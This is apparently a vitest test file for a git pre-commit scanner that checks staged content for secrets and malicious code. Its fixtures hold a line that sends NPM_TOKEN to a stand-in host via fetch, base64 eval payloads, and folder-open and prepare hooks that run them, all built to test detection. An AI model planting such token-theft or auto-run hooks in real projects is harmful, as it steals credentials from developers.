import { spawnSync } from 'node:child_process';
import {
  chmodSync,
  mkdirSync,
  rmSync,
  symlinkSync,
  writeFileSync
} from 'node:fs';
import path from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { runPreCommit } from '../../src/core/pre-commit.js';
import {
  cleanupRepos,
  fakeSecretLine,
  git,
  gitEnv,
  makeRepo,
  tempDir,
  write
} from '../helpers/git-repo.js';

afterEach(cleanupRepos);

const CLEAN = 'export const value = 1;\n';
const blocked = (
  result: Awaited<ReturnType<typeof runPreCommit>>,
  file: string
) => !result.passed && result.findings.some((f) => f.location?.file === file);

// Issue #26: the hook listed staged names but opened working-tree content.
describe('pre-commit scans the staged blob, not the worktree (issue #26)', () => {
  it('detects a secret in the index even when the worktree copy is clean', async () => {
    const root = makeRepo();
    write(root, 'app.ts', fakeSecretLine('staged'));
    git(root, 'add', 'app.ts');
    write(root, 'app.ts', CLEAN); // worktree is clean, index is dirty

    const result = await runPreCommit(root);
    expect(result.scope).toBe('staged');
    expect(blocked(result, 'app.ts')).toBe(true);
  });

  it('does not block a safe staged commit because of an unstaged-only secret', async () => {
    const root = makeRepo();
    write(root, 'app.ts', CLEAN);
    git(root, 'add', 'app.ts');
    write(root, 'app.ts', fakeSecretLine('unstaged')); // only in the worktree

    const result = await runPreCommit(root);
    expect(result.passed).toBe(true);
    expect(
      result.findings.filter((f) => f.location?.file === 'app.ts')
    ).toEqual([]);
  }, 30_000);

  it('traces staged entrypoints through unchanged targets using index blobs', async () => {
    const root = makeRepo();
    write(
      root,
      'package.json',
      JSON.stringify({ name: 'fixture', scripts: {} })
    );
    write(
      root,
      'init',
      `eval(Buffer.from('cGF5bG9hZA==', 'base64').toString());\n`
    );
    git(root, 'add', '-A');
    git(
      root,
      'commit',
      '-q',
      '-m',
      'safe base with unreferenced payload fixture'
    );

    write(
      root,
      'package.json',
      JSON.stringify({ name: 'fixture', scripts: { prepare: 'node init' } })
    );
    git(root, 'add', 'package.json');
    write(root, 'init', CLEAN); // the index still contains the base blob

    const result = await runPreCommit(root);

    expect(blocked(result, 'package.json')).toBe(true);
    expect(
      result.findings.some(
        (finding) =>
          finding.category === 'malicious-content' &&
          Array.isArray(finding.metadata?.trace) &&
          (finding.metadata.trace as string[]).includes('init')
      )
    ).toBe(true);
  });

  it('traces a staged encoded ESLint config to an unchanged extensionless blob', async () => {
    const root = makeRepo();
    write(root, 'package.json', JSON.stringify({ name: 'fixture' }));
    write(root, 'eslint.config.js', 'export default {} satisfies object;\n');
    write(
      root,
      'init',
      `const token = process.env.NPM_TOKEN;\nfetch('https://example.invalid', { method: 'POST', body: token });\neval(Buffer.from('Y29uc29sZS5sb2coJ3NpbXVsYXRlZCcp', 'base64').toString());\n`
    );
    git(root, 'add', '-A');
    git(
      root,
      'commit',
      '-q',
      '-m',
      'safe baseline with unreferenced extensionless blob'
    );

    write(
      root,
      'eslint.config.js',
      `import './init';\nexport default {} satisfies object;\n`
    );
    git(root, 'add', 'eslint.config.js');
    write(root, 'eslint.config.js', 'export default {} satisfies object;\n');
    write(root, 'init', CLEAN); // both staged blobs differ from the worktree

    const result = await runPreCommit(root);

    expect(blocked(result, 'eslint.config.js')).toBe(true);
    const finding = result.findings.find(
      (entry) =>
        entry.category === 'malicious-content' &&
        entry.location?.file === 'eslint.config.js'
    );
    expect(finding?.metadata?.trace).toEqual(['eslint.config.js', 'init']);
    expect(JSON.stringify(finding)).not.toContain('example.invalid');
    expect(JSON.stringify(finding)).not.toContain('NPM_TOKEN');
  }, 30_000);

  it('traces a staged folder-open task through unchanged disguised blobs', async () => {
    const root = makeRepo();
    write(root, '.vscode/tasks.json', JSON.stringify({ tasks: [] }));
    write(root, 'init', "require('./payload.orc');\n");
    write(root, 'payload.orc', 'eval(atob(encoded));\n');
    git(root, 'add', '-A');
    git(
      root,
      'commit',
      '-q',
      '-m',
      'safe baseline with inert unreferenced payload'
    );

    write(
      root,
      '.vscode/tasks.json',
      JSON.stringify({
        tasks: [
          {
            runOptions: { runOn: 'folderOpen' },
            command: 'node init'
          }
        ]
      })
    );
    git(root, 'add', '.vscode/tasks.json');
    write(root, '.vscode/tasks.json', JSON.stringify({ tasks: [] }));

    const result = await runPreCommit(root);

    const finding = result.findings.find(
      (entry) =>
        entry.category === 'malicious-content' &&
        entry.location?.file === '.vscode/tasks.json'
    );
    expect(finding?.ruleId).toBe('TLP-MAL-001');
    expect(finding?.metadata?.trace).toEqual([
      '.vscode/tasks.json',
      'init',
      'payload.orc'
    ]);
  }, 30_000);

  it('handles partial staging: scans exactly what would be committed', async () => {
    const root = makeRepo();
    write(root, 'mixed.ts', `${CLEAN}${fakeSecretLine('partial')}`);
    git(root, 'add', 'mixed.ts');
    write(root, 'mixed.ts', CLEAN); // user removed it from the worktree afterwards
    expect(blocked(await runPreCommit(root), 'mixed.ts')).toBe(true);

    // Now stage the clean version while the secret lingers only in the worktree.
    git(root, 'add', 'mixed.ts');
    write(root, 'mixed.ts', `${CLEAN}${fakeSecretLine('partial')}`);
    expect((await runPreCommit(root)).passed).toBe(true);
  }, 30_000);

  it('still scans staged content when the worktree file was deleted', async () => {
    const root = makeRepo();
    write(root, 'gone.ts', fakeSecretLine('deleted'));
    git(root, 'add', 'gone.ts');
    rmSync(path.join(root, 'gone.ts'));

    expect(blocked(await runPreCommit(root), 'gone.ts')).toBe(true);
  });

  it('scans the new path of a rename', async () => {
    const root = makeRepo();
    write(root, 'old.ts', CLEAN);
    git(root, 'add', 'old.ts');
    git(root, 'commit', '-q', '-m', 'add old');
    git(root, 'mv', 'old.ts', 'renamed.ts');
    write(root, 'renamed.ts', fakeSecretLine('renamed'));
    git(root, 'add', 'renamed.ts');
    write(root, 'renamed.ts', CLEAN);

    const result = await runPreCommit(root);
    expect(blocked(result, 'renamed.ts')).toBe(true);
    expect(result.filesConsidered).toBe(1);
  });

  it('handles odd file names (spaces, quotes, non-ASCII)', async () => {
    const root = makeRepo();
    const names = ['dir with space/my file.ts', 'ünï-cødé.ts', 'quote"s.ts'];
    for (const name of names) {
      if (process.platform === 'win32' && name.includes('"')) continue;
      write(root, name, fakeSecretLine('odd'));
    }
    git(root, 'add', '-A');

    const result = await runPreCommit(root);
    for (const name of names) {
      if (process.platform === 'win32' && name.includes('"')) continue;
      expect(blocked(result, name)).toBe(true);
    }
  });

  it('reports files it could not content-scan instead of silently passing', async () => {
    const root = makeRepo();
    write(root, 'bin.json', '{"a":"\u0000"}');
    write(
      root,
      'big.json',
      JSON.stringify({ pad: 'x'.repeat(2 * 1024 * 1024 + 10) })
    );
    git(root, 'add', '-A');

    const result = await runPreCommit(root);
    expect(result.warnings.join('\n')).toContain('bin.json');
    expect(result.warnings.join('\n')).toContain('big.json');
  });

  it.skipIf(process.platform === 'win32')(
    'records symlinks and submodules as not scanned',
    async () => {
      const root = makeRepo();
      symlinkSync('README.md', path.join(root, 'link.ts'));
      git(root, 'add', 'link.ts');
      const result = await runPreCommit(root);
      expect(result.warnings.join('\n')).toContain(
        'link.ts: not content-scanned (symbolic link)'
      );
    }
  );

  it('fails closed on unmerged index entries', async () => {
    const root = makeRepo();
    write(root, 'c.ts', 'export const v = 0;\n');
    git(root, 'add', 'c.ts');
    git(root, 'commit', '-q', '-m', 'base');
    git(root, 'checkout', '-q', '-b', 'other');
    write(root, 'c.ts', 'export const v = 1;\n');
    git(root, 'commit', '-q', '-am', 'other');
    git(root, 'checkout', '-q', 'main');
    write(root, 'c.ts', 'export const v = 2;\n');
    git(root, 'commit', '-q', '-am', 'main');
    try {
      git(root, 'merge', 'other');
    } catch {
      // Conflict is expected.
    }

    await expect(runPreCommit(root)).rejects.toMatchObject({
      code: 'PRE_COMMIT_UNMERGED_PATHS'
    });
  });

  it('fails closed (not clean) when a staged blob cannot be read', async () => {
    const root = makeRepo();
    write(root, 'lost.ts', fakeSecretLine('lost'));
    git(root, 'add', 'lost.ts');
    const oid = git(root, 'rev-parse', ':lost.ts').trim();
    const object = path.join(
      root,
      '.git',
      'objects',
      oid.slice(0, 2),
      oid.slice(2)
    );
    chmodSync(object, 0o666); // loose objects are read-only; Windows refuses to delete them
    rmSync(object, { force: true });

    await expect(runPreCommit(root)).rejects.toMatchObject({
      code: 'GIT_INDEX_READ_FAILED'
    });
  });

  it('does not read blobs the secret scan would never open (assets, build output)', async () => {
    const root = makeRepo();
    write(root, 'logo.png', 'not really a png');
    write(root, 'ok.ts', CLEAN);
    git(root, 'add', '-A');
    // If pre-commit read every staged blob, this missing asset would fail the
    // whole run; reading only eligible blobs keeps assets out of the budget.
    const oid = git(root, 'rev-parse', ':logo.png').trim();
    const object = path.join(
      root,
      '.git',
      'objects',
      oid.slice(0, 2),
      oid.slice(2)
    );
    chmodSync(object, 0o666);
    rmSync(object, { force: true });

    const result = await runPreCommit(root);
    expect(result.passed).toBe(true);
  });

  it('requires a Git work tree for staged mode', async () => {
    await expect(runPreCommit(tempDir())).rejects.toMatchObject({
      code: 'PRE_COMMIT_GIT_REQUIRED'
    });
  });

  it('keeps --full explicitly worktree-wide', async () => {
    const root = makeRepo();
    write(root, 'wt-only.ts', fakeSecretLine('worktree'));
    expect((await runPreCommit(root)).passed).toBe(true);
    const full = await runPreCommit(root, { full: true });
    expect(full.scope).toBe('full');
    expect(blocked(full, 'wt-only.ts')).toBe(true);
  });

  it('does not let .toolipignore suppress staged security inputs', async () => {
    const root = makeRepo();
    write(root, '.toolipignore', 'fixtures\n');
    write(root, 'fixtures/sample.ts', fakeSecretLine('fixture'));
    git(root, 'add', '-A');
    expect(blocked(await runPreCommit(root), 'fixtures/sample.ts')).toBe(true);
  });
});

// Real `git commit` through the installed hook, including `git commit <paths>`
// which runs the hook against a temporary index (GIT_INDEX_FILE).
describe.skipIf(process.platform === 'win32')(
  'real git commit through the hook',
  () => {
    const tsxCli = path.resolve('node_modules/tsx/dist/cli.mjs');
    const entry = path.resolve('src/index.ts');

    function repoWithHook(): string {
      const root = makeRepo();
      const bin = path.join(root, 'node_modules', '.bin');
      mkdirSync(bin, { recursive: true });
      const stub = path.join(bin, 'toolip');
      writeFileSync(
        stub,
        `#!/bin/sh\nexec "${process.execPath}" "${tsxCli}" "${entry}" "$@"\n`
      );
      chmodSync(stub, 0o755);
      const install = spawnSync(
        process.execPath,
        [tsxCli, entry, 'hook', 'install', '--path', root],
        {
          encoding: 'utf8',
          env: gitEnv()
        }
      );
      expect(install.status).toBe(0);
      return root;
    }

    const commit = (root: string, ...args: string[]) =>
      spawnSync('git', ['commit', '-q', '-m', 'test', ...args], {
        cwd: root,
        encoding: 'utf8',
        env: gitEnv()
      });

    it('blocks a commit whose index holds a secret that the worktree no longer has', () => {
      const root = repoWithHook();
      const before = git(root, 'rev-parse', 'HEAD').trim();
      write(root, 'leak.ts', fakeSecretLine('hooked'));
      git(root, 'add', 'leak.ts');
      write(root, 'leak.ts', CLEAN);

      const result = commit(root);
      expect(result.status).not.toBe(0);
      expect(git(root, 'rev-parse', 'HEAD').trim()).toBe(before);
    }, 60_000);

    it('allows a commit when only an unstaged change contains a secret', () => {
      const root = repoWithHook();
      write(root, 'ok.ts', CLEAN);
      git(root, 'add', 'ok.ts');
      write(root, 'other.ts', fakeSecretLine('unstaged')); // untracked, never staged

      const result = commit(root);
      expect(result.status).toBe(0);
    }, 60_000);

    it('scans the temporary index used by `git commit <paths>`', () => {
      const root = repoWithHook();
      write(root, 'path-commit.ts', fakeSecretLine('pathspec'));
      git(root, 'add', '-N', 'path-commit.ts');

      const result = commit(root, 'path-commit.ts');
      expect(result.status).not.toBe(0);
    }, 60_000);

    it('blocks a path-limited commit of a staged secret in a subdirectory', () => {
      const root = repoWithHook();
      const before = git(root, 'rev-parse', 'HEAD').trim();
      write(root, 'src/nested/leak.ts', fakeSecretLine('nested'));
      git(root, 'add', 'src/nested/leak.ts');

      const result = commit(root, 'src/nested/leak.ts');
      expect(result.status).not.toBe(0);
      expect(git(root, 'rev-parse', 'HEAD').trim()).toBe(before);
    }, 60_000);
  }
);
